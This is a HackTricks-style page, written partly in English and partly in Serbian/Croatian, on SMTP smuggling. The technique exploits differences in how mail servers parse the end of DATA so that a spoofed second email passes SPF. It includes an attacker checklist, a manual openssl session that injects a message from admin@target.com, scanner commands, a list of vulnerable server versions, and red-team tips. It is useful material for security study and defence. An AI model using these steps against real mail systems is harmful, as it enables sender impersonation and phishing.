# SMTP Smuggling

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

This type of vulnerability was [**originally discovered in this post**](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/) were it's explained that It's possible to **exploit discrepancies in how the SMTP protocol is interpreted** when finalising an email, allowing an attacker to smuggle more emails in the body of the legit one, allowing to impersonate other users of the affected domain (such as admin@outlook.com) bypassing defenses such as SPF.

### Why

To je zato što u SMTP protokolu, **data of the message** koja se šalje u emailu je kontrolisana od strane korisnika (napadača) koji može poslati posebno oblikovane podatke iskorišćavajući razlike u parserima da bi smuggled dodatne email-ove u prijemnik. Pogledajte ilustrovani primer iz originalnog posta:

<figure><img src="../../images/image (8) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png">https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_12/SMTP_Smuggling-Overview__09_.png</a></p></figcaption></figure>

### How

Da bi iskoristio ovu ranjivost, napadač mora poslati podatke koje **izlazni SMTP server smatra da je samo 1 email, ali ulazni SMTP server smatra da postoje više email-ova**.

Istraživači su otkrili da različiti **ulazni serveri smatraju različite karaktere kao kraj data** email poruke koje izlazni serveri ne smatraju. Na primer, regularan kraj data je `\r\n.\r`. Ali ako ulazni SMTP server takođe podržava `\n.`, napadač može jednostavno dodati **taj podatak u svoj email i početi unositi SMTP komande** novog email-a da bi ga smuggled, baš kao na prethodnoj slici.

Naravno, ovo može raditi samo ako **izlazni SMTP server ne tretira ovaj data** kao kraj poruke, jer u tom slučaju će videti 2 email-a umesto jednog — na kraju krajeva radi se o desinhronizaciji koja se iskorišćava u ovoj ranjivosti.

Potencijalni desinhronizacioni podaci:

- `\n.`
- `\n.\r`

Takođe imajte na umu da se SPF zaobilazi jer ako smuggle-ujete email iz `admin@outlook.com` iz email-a `user@outlook.com`, **pošiljalac je i dalje `outlook.com`.**

---

## Attacker’s checklist (what conditions must hold?)

To successfully smuggle a second email, you typically need:

- Izlazni server A kroz koji možete slati (često sa validnim kredencijalima) koji će proslijediti ne‑standardni end‑of‑DATA niz neizmenjen. Mnoge usluge su istorijski prosljeđivale varijante kao `\n.\r\n` or `\n.\n`.
- Prijemni server B koji će tumačiti taj ne‑standardni niz kao end‑of‑DATA i onda parsirati ono što sledi kao nove SMTP komande (MAIL/RCPT/DATA...).
- Izlazni mora zaista slati sa `DATA` (ne `BDAT`). Ako A podržava CHUNKING/BDAT, smuggling radi samo ako se vrati na DATA (npr. B ne oglašava CHUNKING), inače length‑framed BDAT sprečava dvosmislenost.
- PIPELINING nije neophodan ali pomaže da se ubacene komande sakriju u jednom TCP write-u tako da međusrednji uređaji ne resinhronizuju.

Uobičajene varijante kraja DATA vredne testiranja (zavisno od prijemnika):

- `\n.\n`
- `\n.\r\n`
- `\r.\r\n`
- `\r\n.\r` (bare CR at end)

Note: What works is the intersection of “what A forwards” ∩ “what B accepts”.

---

## Manual exploitation example (single session)

The following shows the idea using a raw STARTTLS SMTP session. After the first DATA block we insert a non‑standard terminator, then another SMTP dialog that the receiving server may treat as a new message.

<details>
<summary>Manual smuggling session (STARTTLS)</summary>
```
$ openssl s_client -starttls smtp -crlf -connect smtp.example.com:587
EHLO a.example
AUTH PLAIN <base64(\0user@example.com\0password)>
MAIL FROM:<user@example.com>
RCPT TO:<victim@target.com>
DATA
From: User <user@example.com>
To: victim <victim@target.com>
Subject: legit

hello A
\n.\r\nMAIL FROM:<admin@target.com>
RCPT TO:<victim@target.com>
DATA
From: Admin <admin@target.com>
To: victim <victim@target.com>
Subject: smuggled

hello B
\r\n.\r\n
```
Ako A prosledi `\n.\r\n` i B to prihvati kao end‑of‑DATA, poruka “hello B” može biti prihvaćena kao drugi email od `admin@target.com` dok prolazi SPF (poravnato sa A‑ovim IP adresama).
</details>

Savet: Kada testirate interaktivno, osigurajte da koristite `-crlf` kako bi OpenSSL sačuvao CRLF u onome što otkucate.

---

## Automation and scanners

- hannob/smtpsmug: pošaljite poruku koja se završava višestrukim neispravnim end‑of‑DATA sekvencama da biste videli šta primalac prihvata.
- Primer: `./smtpsmug -s mail.target.com -p 25 -t victim@target.com`
- The‑Login/SMTP‑Smuggling‑Tools: skener za obe strane (dolaznu i odlaznu) plus SMTP server za analizu da biste tačno videli koje sekvence prežive pošiljaoca.
- Brza provera (inbound): `python3 smtp_smuggling_scanner.py victim@target.com`
- Odlazno preko releja: `python3 smtp_smuggling_scanner.py YOUR@ANALYSIS.DOMAIN --outbound-smtp-server smtp.relay.com --port 587 --starttls --sender-address you@relay.com --username you@relay.com --password '...'
`

Ovi alati pomažu da mapirate A→B parove gde smuggling zaista radi.

---

## CHUNKING/BDAT vs DATA

- DATA koristi sentinel terminator `<CR><LF>.<CR><LF>`; svaka nejasnoća u načinu na koji se CR/LF normalizuju ili dot‑stuffing radi dovodi do desinhronizacije.
- CHUNKING (BDAT) okviruje telo preciznom dužinom u bajtovima i stoga sprečava klasični smuggling. Međutim, ako pošiljalac pređe na DATA (jer primalac ne oglašava CHUNKING), klasični smuggling ponovo postaje moguć.

---

## Notes on affected software and fixes (for targeting)

- Postfix: pre 3.9 podrazumevano je tolerisao bare LFs; od 3.5.23/3.6.13/3.7.9/3.8.4 administratori mogu omogućiti `smtpd_forbid_bare_newline`. Trenutni savet je `smtpd_forbid_bare_newline = normalize` (3.8.5+/3.7.10+/3.6.14+/3.5.24+) ili podesiti na `reject` za strogu RFC primenu.
- Exim: ispravljeno u 4.97.1 (i novijim) za varijante koje se oslanjaju na mešane end‑of‑DATA sekvence kada se koristi DATA. Stariji 4.97/4.96 mogu biti eksploatisani u zavisnosti od PIPELINING/CHUNKING.
- Sendmail: ispravljeno u 8.18; stariji 8.17.x prihvatao je neke nestandardne terminatore.
- Razne biblioteke/serversi (npr. aiosmtpd pre 1.4.5, neki vendor gateways, i određeni SaaS releji) su imali slične probleme; moderne verzije obično prihvataju DATA samo sa strogo `<CR><LF>.<CR><LF>`.

Koristite gore pomenute skenere da verifikujete trenutno ponašanje; mnogi dobavljači su promenili podrazumevana podešavanja početkom 2024–2025.

---

## Tips for red team ops

- Preferirajte velike komercijalne pošiljaoce za A (istorijski Exchange Online, shared hosteri, itd.). Ako oni i dalje prosleđuju neke nestandardne EOM i nalaze se u SPF‑u mete, vaš smuggled MAIL FROM će naslediti njihovu reputaciju.
- Enumerišite SMTP ekstenzije B: `EHLO` banner za PIPELINING/CHUNKING; ako CHUNKING nedostaje imate veću šansu protiv BDAT‑first pošiljalaca. Kombinujte sa neispravnim EOM‑ovima da biste ispitali prihvatanje.
- Pratite zaglavlja: smuggled poruka će obično stvoriti poseban lanac Received koji počinje kod B. DMARC će često proći zato što se MAIL FROM poklapa sa A‑ovim IP prostorom.

---

## **Reference**

- [https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [https://www.postfix.org/smtp-smuggling.html](https://www.postfix.org/smtp-smuggling.html)

{{#include ../../banners/hacktricks-training.md}}
